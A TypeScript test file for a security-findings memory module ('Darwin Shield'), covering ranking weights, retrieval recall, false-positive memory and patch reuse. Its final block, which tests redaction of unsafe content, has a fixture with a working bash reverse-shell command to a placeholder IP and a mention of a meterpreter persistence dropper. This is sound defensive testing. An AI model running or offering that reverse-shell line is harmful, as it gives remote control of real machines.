// SPDX-License-Identifier: MIT
//
// Darwin Shield ruVector memory (ADR-155 §advanced ruVector integration). The
// claims under test: hybrid ranking uses the documented weights; retrieval recall
// is high; negative memory down-ranks repeated false positives; patch memory and
// genome memory return reusable artifacts. These are what make Darwin compound.

import { describe, expect, it } from 'vitest';
import { HYBRID_WEIGHTS, RuvSecurityMemory, centrality, hybridRank } from '../../src/security/memory.js';
import { defaultCorpus, groundTruth } from '../../src/security/corpus.js';
import { baselineGenome } from '../../src/security/genome.js';
import type { Finding, RepoProfile } from '../../src/security/types.js';

describe('hybridRank — documented weights (ADR-155)', () => {
  it('weights sum to the published vector', () => {
    expect(HYBRID_WEIGHTS.vectorSimilarity).toBe(0.45);
    expect(HYBRID_WEIGHTS.callgraphCentrality).toBe(0.2);
    expect(HYBRID_WEIGHTS.taintSinkProximity).toBe(0.15);
    expect(HYBRID_WEIGHTS.historicalFindingSimilarity).toBe(0.1);
    expect(HYBRID_WEIGHTS.recentChangeWeight).toBe(0.1);
    expect(HYBRID_WEIGHTS.falsePositiveSimilarity).toBe(-0.25);
  });

  it('a strong false-positive similarity drags the rank down', () => {
    const clean = hybridRank({
      vectorSimilarity: 0.8,
      callgraphCentrality: 0.5,
      taintSinkProximity: 0.9,
      historicalFindingSimilarity: 0.8,
      recentChangeWeight: 0.5,
      falsePositiveSimilarity: 0,
    });
    const fp = hybridRank({
      vectorSimilarity: 0.8,
      callgraphCentrality: 0.5,
      taintSinkProximity: 0.9,
      historicalFindingSimilarity: 0.8,
      recentChangeWeight: 0.5,
      falsePositiveSimilarity: 1,
    });
    expect(fp).toBe(round(clean - 0.25));
  });

  it('centrality normalises degree into [0,1]', () => {
    expect(centrality(0)).toBe(0);
    expect(centrality(12)).toBe(1);
    expect(centrality(24)).toBe(1);
  });
});

describe('RuvSecurityMemory — retrieval recall', () => {
  it('recall@20 over indexed corpus code is ≥ 0.85 for a matching query', () => {
    const corpus = defaultCorpus();
    const mem = new RuvSecurityMemory();
    for (const repo of corpus.repos) mem.indexSites(repo.repo, repo.commit, repo.sites);

    // Query for SQL-injection-like code; the relevant set is the ts SQLi vuln path.
    const relevant = ['src/query.ts'];
    const recall = mem.recallAtK('SQL injection query builder unsanitized input', relevant, 20);
    expect(recall).toBeGreaterThanOrEqual(0.85);
  });

  it('recall@20 across all ground-truth paths is high', () => {
    const corpus = defaultCorpus();
    const mem = new RuvSecurityMemory();
    for (const repo of corpus.repos) mem.indexSites(repo.repo, repo.commit, repo.sites);
    const paths = groundTruth(corpus).map((s) => s.file);
    // A broad query naming the weaknesses recalls most ground-truth files.
    const recall = mem.recallAtK(
      groundTruth(corpus).map((s) => s.weakness).join(' '),
      paths,
      20,
    );
    expect(recall).toBeGreaterThanOrEqual(0.85);
  });
});

function fp(weakness: string, file: string): Finding {
  return {
    id: `fp-${file}`,
    repo: 'r',
    commit: 'c',
    file,
    symbol: 'x',
    weakness,
    confidence: 0.4,
    evidence: [weakness],
    verdict: 'false_positive',
    exploitCodeAllowed: false,
  };
}

describe('RuvSecurityMemory — negative memory', () => {
  it('similarity to a recorded false positive is high; unrelated is low', () => {
    const mem = new RuvSecurityMemory();
    mem.writeFalsePositive(fp('path traversal sanitize_path', 'src/util.rs'));
    expect(mem.falsePositiveSimilarity('path traversal sanitize_path src/util.rs')).toBeGreaterThan(0.5);
    expect(mem.falsePositiveSimilarity('totally unrelated cryptography rotation')).toBeLessThan(0.3);
  });
});

describe('RuvSecurityMemory — patch + genome memory (reuse)', () => {
  it('retrieves an accepted patch for a similar weakness', () => {
    const mem = new RuvSecurityMemory();
    mem.writeConfirmed({
      id: 'c1',
      repo: 'r',
      commit: 'c',
      file: 'src/query.ts',
      symbol: 'buildQuery',
      weakness: 'CWE-89 SQL injection',
      confidence: 0.9,
      evidence: ['x'],
      patch: 'use parameterized queries',
      test: 'reject injection input',
      verdict: 'confirmed',
      exploitCodeAllowed: false,
    });
    const patches = mem.retrievePatches('SQL injection parameterized', 3);
    expect(patches.length).toBeGreaterThan(0);
    expect(patches[0].patch).toContain('parameterized');
  });

  it('seeds a population from a prior winning genome on a similar profile', () => {
    const mem = new RuvSecurityMemory();
    const profile: RepoProfile = {
      repo: 'corpus/ts/web-api',
      commit: 'e4f5a6b',
      languages: ['ts'],
      frameworks: ['express'],
      unitCount: 5,
      attackSurface: [],
      summary: '',
    };
    mem.writeGenome(profile, { ...baselineGenome(), id: 'champ', reviewerCount: 5 });
    const seeds = mem.seedPopulation(profile, 4);
    expect(seeds.length).toBeGreaterThan(0);
    expect(seeds[0].id).toBe('champ');
  });
});

function round(v: number): number {
  return +(Math.round(v * 1e6) / 1e6).toFixed(6);
}

// `compounding.ts`/`ablation.ts` call `writeConfirmed`/`writeFalsePositive` directly
// with raw, corpus-derived findings — unlike `runSwarm`/`runAgenticLoop`, which only
// ever reach memory through `gateOutputs()`. These two methods are the only other
// door into persistent memory, so they must gate for themselves (ADR-155 §safety
// controls: "any string that would leave the sandbox").
describe('RuvSecurityMemory — writeConfirmed/writeFalsePositive gate unsafe content', () => {
  function unsafeFinding(overrides: Partial<Finding> = {}): Finding {
    return {
      id: 'u1',
      repo: 'r',
      commit: 'c',
      file: 'src/handler.ts',
      symbol: 'handle',
      weakness: 'CWE-78 OS command injection',
      confidence: 0.9,
      evidence: ['PoC: bash -i >& /dev/tcp/1.2.3.4/9001 0>&1'],
      patch: 'drop a meterpreter dropper for persistence',
      verdict: 'confirmed',
      exploitCodeAllowed: false,
      ...overrides,
    };
  }

  it('writeConfirmed redacts unsafe evidence before it reaches confirmedFindings', () => {
    const mem = new RuvSecurityMemory();
    mem.writeConfirmed(unsafeFinding());
    const stored = mem.confirmedFindings.all().map((e) => e.payload);
    expect(stored).toHaveLength(1);
    expect(stored[0].evidence[0]).not.toMatch(/\/dev\/tcp/);
    expect(stored[0].evidence[0]).toContain('[REDACTED:unsafe-content]');
  });

  it('writeConfirmed redacts an unsafe patch before it reaches the patch collection', () => {
    const mem = new RuvSecurityMemory();
    mem.writeConfirmed(unsafeFinding({ test: 'reject the malicious input' }));
    const patches = mem.retrievePatches('OS command injection', 3);
    expect(patches.length).toBeGreaterThan(0);
    expect(patches[0].patch).not.toMatch(/meterpreter/);
    expect(patches[0].patch).toContain('[REDACTED:unsafe-content]');
  });

  it('writeFalsePositive redacts unsafe evidence before it reaches falsePositives', () => {
    const mem = new RuvSecurityMemory();
    mem.writeFalsePositive(unsafeFinding({ id: 'u2', verdict: 'false_positive' }));
    const stored = mem.falsePositives.all().map((e) => e.payload);
    expect(stored).toHaveLength(1);
    expect(stored[0].evidence[0]).toContain('[REDACTED:unsafe-content]');
  });

  it('a clean finding is stored byte-identical (no regression for the gated callers)', () => {
    const mem = new RuvSecurityMemory();
    const clean: Finding = {
      id: 'c2',
      repo: 'r',
      commit: 'c',
      file: 'src/query.ts',
      symbol: 'buildQuery',
      weakness: 'CWE-89 SQL injection',
      confidence: 0.9,
      evidence: ['user input reaches the query builder unsanitized'],
      patch: 'use parameterized queries',
      test: 'reject injection input',
      verdict: 'confirmed',
      exploitCodeAllowed: false,
    };
    mem.writeConfirmed(clean);
    const stored = mem.confirmedFindings.all().map((e) => e.payload);
    expect(stored).toEqual([clean]);
  });
});
